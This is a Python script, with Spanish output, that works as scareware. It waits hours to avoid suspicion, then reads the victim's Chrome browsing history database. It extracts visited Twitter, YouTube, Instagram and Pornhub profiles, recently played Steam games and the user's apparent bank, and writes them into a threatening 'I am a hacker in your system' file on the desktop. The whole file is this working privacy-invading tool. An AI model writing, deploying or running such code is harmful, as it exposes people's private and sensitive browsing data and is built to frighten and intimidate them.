import os
import time
import random
import sqlite3
from pathlib import Path
import re
import glob
from shutil import copyfile


def delay_action():
    wait = random.randint(1, 4)
    print("Durmiendo por {} horas.".format(wait))
    time.sleep(wait * 60 * 60)


def user_path():
    user = str(Path.home())
    return user


def create_hacker_file(desktop_path):
    hacker_file = open(desktop_path + "hola.txt", "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.")
    return hacker_file


def create_hacker_file_ondedrive(desktop_path_onedrive):
    hacker_file = open(desktop_path_onedrive + "hola.txt", "w")
    hacker_file.write("Hola, soy un hacker y me he colado en tu sistema.\n\n")
    return hacker_file


def get_chrome_history(user_path, desktop_path):
    urls = None

    while not urls:

        try:

            history_path = user_path + "AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

            # if database is open
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)

            # Talk with database

            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()

            return urls

        except sqlite3.OperationalError:
            print("La base de datos está abierta. Reintentando en 3 segundos")
            time.sleep(3)


def get_chrome_history_onedrive(user_path, desktop_file_onedrive):
    urls = None

    while not urls:

        try:

            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"

            # if database is open
            temp_history = history_path + "temp"
            copyfile(history_path, temp_history)

            # Talk with database

            connection = sqlite3.connect(temp_history)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            print(urls)
            connection.close()

            return urls

        except sqlite3.OperationalError:
            print("La base de datos está abierta. Reintentando en 3 segundos")
            time.sleep(3)


def check_tw_profiles(hacker_file, chrome_history):

    visited_profiles = []

    for item in chrome_history:
        results = re.findall("https://twitter.com/([A-Za-z0-9_]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "messages", "explore"]:
            visited_profiles.append(results[0])

    if len(visited_profiles) > 0:
        hacker_file.write("He visto que has estado husmeando en Twitter los perfiles de {}...\n\n"
                          .format(", ".join(visited_profiles)))
    else:
        hacker_file.write("Felicidades, estás limpio en Twitter.")


def check_yt_profiles(hacker_file, chrome_history):

    visited_profiles = []

    for item in chrome_history:
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9_]+)$", item[2])
        if results:
            visited_profiles.append(results[0])

    if len(visited_profiles) > 0:
        hacker_file.write("He visto que has estado husmeando en Youtube los perfiles de {}...\n\n"
                          .format(", ".join(visited_profiles)))
    else:
        hacker_file.write("Felicidades, estás limpio en Youtube.")


def check_insta_profiles(hacker_file, chrome_history):

    visited_profiles = []

    for item in chrome_history:
        results = re.findall("https://www.instagram.com/([A-Za-z0-9_]+)/$", item[2])
        if results:
            visited_profiles.append(results[0])

    if len(visited_profiles) > 0:
        hacker_file.write("He visto que has estado husmeando en Instagram los perfiles de {}...\n\n"
                          .format(", ".join(visited_profiles)))
    else:
        hacker_file.write("Felicidades, estás limpio en Instagram.")


def check_ph_profiles(hacker_file, chrome_history):

    visited_profiles = []

    for item in chrome_history:
        results_models = re.findall("https://www.pornhub.com/model/([A-Za-z0-9_\-]+)$", item[2])
        results_pornstars = re.findall("https://www.pornhub.com/pornstar/([A-Za-z0-9_\-]+)$", item[2])
        if results_models:
            visited_profiles.append(results_models[0])
        elif results_pornstars:
            visited_profiles.append(results_pornstars[0])

    if len(visited_profiles) > 0:
        hacker_file.write("He visto que has estado husmeando en Pornhub los perfiles de {}...\n\n"
                          .format(", ".join(visited_profiles)))
    else:
        hacker_file.write("Felicidades, estás limpio en Pornhub.\n\n")


def check_steam_games(hacker_file):
    try:
        steam_path = str(os.getenv("SystemDrive")) + "/Program Files (x86)/Steam/steamapps/common/*"
        game_paths = glob.glob(steam_path)
        game_paths.sort(key=os.path.getmtime, reverse=True)
        games = []

        for game_path in game_paths:
            if game_path.split("\\")[-1] not in ["Steamworks Shared", "Steam Controller Configs"]:
                games.append(game_path.split("\\")[-1])

        if games:
            hacker_file.write("He visto que últimamente has estado jugando a {}... Interesante...\n\n"
                              .format(", ".join(games[:3])))
    except Exception:
        pass


def check_bank(hacker_file, chrome_history):
    his_bank = None
    banks = ["CaixaBank", "Santander", "BBVA", "Sabadell", "Bankia", "Bankinter", "Andbank", "Cajamar", "Banco Popular",
             "Unicaja", "Ibercaja", "Kutxabank", "Liberbank", "EBN", "Cecabank", "Bankoa", "Caixa Geral", "Bankinter",
             "ING Direct", "Abanca", "Evo Banco", "N26", "FerratumBank"]

    for item in chrome_history:
        for b in banks:
            if b.lower() in item[0].lower():
                his_bank = b
                break
        if his_bank:
            break

    if his_bank:
        hacker_file.write("¿Tal vez tu banco es {}? Ten cuidado...\n\n".format(his_bank))
    else:
        pass


def main():

    # Pathing
    user = user_path()

    desktop_path = user + "\\Desktop\\"
    desktop_file_onedrive = user + "\\OneDrive\\Escritorio\\"

    # Wait so it doesn't look sus
    delay_action()

    try:
        chrome_history = get_chrome_history(user, desktop_path)
        hacker_file = create_hacker_file(desktop_path)

        # Writing frightening messages
        check_tw_profiles(hacker_file, chrome_history)
        check_yt_profiles(hacker_file, chrome_history)
        check_insta_profiles(hacker_file, chrome_history)

    except Exception:
        chrome_history = get_chrome_history_onedrive(user, desktop_file_onedrive)
        hacker_file_onedrive = create_hacker_file_ondedrive(desktop_file_onedrive)

        # Writing frightening messages
        check_tw_profiles(hacker_file_onedrive, chrome_history)
        check_yt_profiles(hacker_file_onedrive, chrome_history)
        check_insta_profiles(hacker_file_onedrive, chrome_history)
        check_ph_profiles(hacker_file_onedrive, chrome_history)
        check_steam_games(hacker_file_onedrive)
        check_bank(hacker_file_onedrive, chrome_history)


if __name__ == "__main__":
    main()
